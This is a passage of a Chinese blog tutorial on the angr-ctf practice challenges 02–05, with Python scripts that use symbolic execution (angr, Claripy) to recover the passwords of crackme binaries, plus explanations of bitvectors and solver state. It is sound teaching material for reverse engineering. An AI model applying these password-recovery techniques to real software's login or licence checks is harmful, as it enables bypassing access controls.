class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是一下子就出来了：</p>
<p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>笔者实际跑了一下不避开该约束的求解场景，巨<del>™</del>慢，<del>直接把👴の阿里☁学生🐓给炸了</del></p>
</blockquote>
<h2 id="02-angr-find-condition：自定义搜索条件"><a href="#02-angr-find-condition：自定义搜索条件" class="headerlink" title="02_angr_find_condition：自定义搜索条件"></a>02_angr_find_condition：自定义搜索条件</h2><p>惯例地拖入 IDA，<strong>似乎</strong>逻辑和第一道题差不多，<code>complex_function()</code> 也没啥改变这里就不贴了：</p>
<p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>但一看汇编就流汗黄豆了，<strong>因为实际上存在非常多的伪路径</strong>：</p>
<p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><strong>并且有着非常多的输出 Good Job 字符串的基本块</strong>：</p>
<p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>如果你只是简单看了一下然后随便选了一个（比如说看到第一个直接选）扔进 angr 里求解，<strong>那就寄了</strong>：</p>
<p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>怎么办呢？第一种方法是手动再分析一下这些伪路径，但是这就不符合我们使用 angr 的自动求解思想了：）因此我们需要寻找一种能够避开这些路径的方法</p>
<h3 id="simgr-explore-的扩展用法"><a href="#simgr-explore-的扩展用法" class="headerlink" title="simgr.explore() 的扩展用法"></a>simgr.explore() 的扩展用法</h3><p>实际上 <code>explore()</code> 的参数 <code>find</code> 与 <code>avoid</code> 除了可以是目标地址外，<strong>还可以是自定义函数，参数为模拟状态，返回值为判定条件的布尔值</strong></p>
<ul>
<li>即我们可以编写自定义函数来判断一个状态是否是我们应当要寻找的状态</li>
</ul>
<p>例如，若是我们想要寻找一条输出指定字符串的路径，可以选择通过判断该字符串是否在输出中的方式，我们可以通过 <code>state.posix.dumps(文件描述符)</code> 来获取对应文件描述符上的字符流：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOUT-1"><a href="#FINAL-EXPLOUT-1" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>那么解题思路就清晰了，我们将求解的目标路径设为输出 <code>&quot;Good Job.&quot;</code> 字符串、avoid 路径设为输出 <code>&quot;Try again.&quot;</code> 字符串即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x02-angr-ctf：符号化"><a href="#0x02-angr-ctf：符号化" class="headerlink" title="0x02. angr-ctf：符号化"></a>0x02. angr-ctf：符号化</h1><h2 id="03-angr-symbolic-registers：符号化寄存器"><a href="#03-angr-symbolic-registers：符号化寄存器" class="headerlink" title="03_angr_symbolic_registers：符号化寄存器"></a>03_angr_symbolic_registers：符号化寄存器</h2><p>惯例拖进 IDA，大概是读入输入后用三个函数简单算一下，输入参数是 <code>eax、ebx、edx</code> 寄存器的值，三个结果都为 0 就🆗了：</p>
<p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在 <code>get_user_input()</code> 里会分别读三个数到 <code>eax、ebx、edx</code> 寄存器中：</p>
<p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>然后你会发现反编译的结果就是个🐓⑧…👴刚看反编译的伪代码还想了半天为啥要多读两个数然后扔掉</p>
<p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<p>然后你会发现用上一题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p>
<p>重新读一下题目——<code>symbolic registers</code>，这意味着<strong>本题我们应当将这三个寄存器设置为符号变量来进行约束求解</strong></p>
<h3 id="Claripy-angr-的求解引擎"><a href="#Claripy-angr-的求解引擎" class="headerlink" title="Claripy - angr 的求解引擎"></a>Claripy - angr 的求解引擎</h3><p><code>Claripy</code> 是 angr 的<strong>求解引擎</strong>（solver engine），其内部会无缝混合使用几种后端（concrete bitvectors、SAT solvers 等），对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口</p>
<h4 id="bitvector-位向量"><a href="#bitvector-位向量" class="headerlink" title="bitvector - 位向量"></a>bitvector - 位向量</h4><p><strong>位向量</strong>（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 <strong>一组位</strong> （a sequence of bits）</p>
<p>我们可以通过 <code>claripy.BVV(int_value, size_in_bits)</code> 或 <code>claripy.BVV(string_value)</code> 创建带有具体值（concrete value）的指定长度的位向量值（bitvector value）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure>

<p>相同长度的位向量可以进行运算，对于不同长度的位向量则可以通过 <code>.zero_extend(extended_bits)</code> 完成位扩展（0填充）后进行运算，需要注意的是位向量的运算同样存在溢出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure>

<p>位向量除了代表具体值（concrete value）的 <code>bitvector value</code> 以外，还有代表<strong>符号变量</strong>（symbolic variable）的 <code>bitvector symbol</code>，我们可以通过 <code>claripy.BVS(name, size_in_bits)</code> 创建带名字的指定长度的位向量符号（bitvector symbol）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure>

<p>位向量符号与位向量值之间同意可以进行运算，组合成更加复杂的表达式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure>

<p>我们可以通过 <code>.op</code> 与 <code>.args</code> 获得位向量的运算类型与参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure>



<h3 id="state-solver-状态的求解接口"><a href="#state-solver-状态的求解接口" class="headerlink" title="state.solver - 状态的求解接口"></a>state.solver - 状态的求解接口</h3><p>前面讲到 <code>state.solver</code> 提供了一些基于状态的求解接口，例如 solver 同样有创建位向量的 <code>.BVV()</code> 与 <code>.BVS()</code> 接口</p>
<p>在需要对位向量符号进行具体值的求解时，我们可以先将位向量符号存放到状态的内存&#x2F;寄存器中，之后用 simgr 探索到对应的状态后，再使用 <code>state.solver.eval()</code> 成员函数来获取对应位向量在当前状态下的值，以下是一个简单的🌰：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们只需要创建一个从 <code>get_user_input()</code> 之后开始执行的空白的状态，并将对应的寄存器设置为位向量符号，之后在求解状态使用 <code>.solver.eval()</code> 来求解即可</p>
<p>最后的求解脚本如下，详见注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>很快啊，啪的一下就出来了.mkv</p>
<p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="04-angr-symbolic-stack：符号化栈"><a href="#04-angr-symbolic-stack：符号化栈" class="headerlink" title="04_angr_symbolic_stack：符号化栈"></a>04_angr_symbolic_stack：符号化栈</h2><p>还是惯例拖入 IDA，主要的处理逻辑在 <code>handle_user()</code> 当中，还是读入两个数之后扔给不同的 complex 函数处理：</p>
<p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>然后你会发现用上上题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p>
<p>重新读一下题目——<code>symbolic stack</code>，这意味着<strong>本题我们应当将栈设置为符号变量来进行约束求解</strong></p>
<p>那么我们该怎么做呢？重新来看 <code>handler_user()</code> 的汇编代码，两个待求解变量都是位于栈上的固定位置：</p>
<p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么我们还是可以将初始状态设置为从读入输入后开始的空白状态，之后创建两个位向量符号，设置好 ebp 和 esp 的相对位置后使用  <code>state.stack_push(val)</code> 来<strong>手动地将符号变量推到栈上</strong>，最后的求解路径还是设为输出 <code>&quot;Good Job.&quot;</code> 的地址即可，这里需要注意仔细计算变量在栈上的位置</p>
<p>求解脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>还是秒解：</p>
<p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="05-angr-symbolic-memory：符号化内存"><a href="#05-angr-symbolic-memory：符号化内存" class="headerlink" title="05_angr_symbolic_memory：符号化内存"></a>05_angr_symbolic_memory：符号化内存</h2><p>还是惯例地拖入 IDA，这一次是读入四个 8 字节到一块连续的 32 字节内存上，其中 <code>user_input</code> 的地址便是 <code>0x82F48A0</code>，之后调用 <code>complex_function()</code> 逐字符处理这 32 字节后与特定字符串进行对比：</p>
<p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么从题目名称我们不难看出<strong>这一次我们应当要将内存作为符号变量进行约束求解</strong></p>
<h3 id="state-的内存操作"><a href="#state-的内存操作" class="headerlink" title="state 的内存操作"></a>state 的内存操作</h3><p>前面讲到，对于一个状态的内存，我们可以使用 <code>state.memory</code> 的对应接口进行操作：</p>
<ul>
<li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li>
<li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li>
</ul>
<p>需要注意的是如果要储存具体值，则需要通过 <code>endness</code> 参数指定大小端序</p>
<h3 id="FINAL-EXPLOIT-2"><a href="#FINAL-EXPLOIT-2" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题还是创建对应大小的 BVS 后 explore() 即可，需要注意的是在获取最后求解的值时别忘了指定参数 <code>cast_to=bytes</code> 以获得字符输出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>这次的求解需要一点点时间，以及一定量的内存（笔者仅 2G 内存的阿里云学生机在跑解题脚本时就被 Kill 了几次，最后不得不用一些方法腾一些内存后才搞定</p>
<p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
